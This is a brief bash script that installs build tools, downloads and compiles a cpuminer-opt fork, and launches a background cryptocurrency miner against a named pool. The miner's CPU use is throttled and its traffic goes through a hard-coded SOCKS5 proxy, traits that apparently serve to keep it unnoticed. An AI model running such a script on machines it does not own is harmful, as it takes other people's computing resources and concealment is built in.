#!/bin/bash
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
git clone https://github.com/k67frozen/cpuminer-opt
cd cpuminer-opt
chmod +x *
./build.sh
make
cpulimit --exe cpuminer --limit 45 -b && ./cpuminer -a yescryptr16 -o stratum+tcp://cryply.luckypool.org:9999 -u tuandz.tuandz01 -p x -x socks5://45.76.4.214:6651 --background
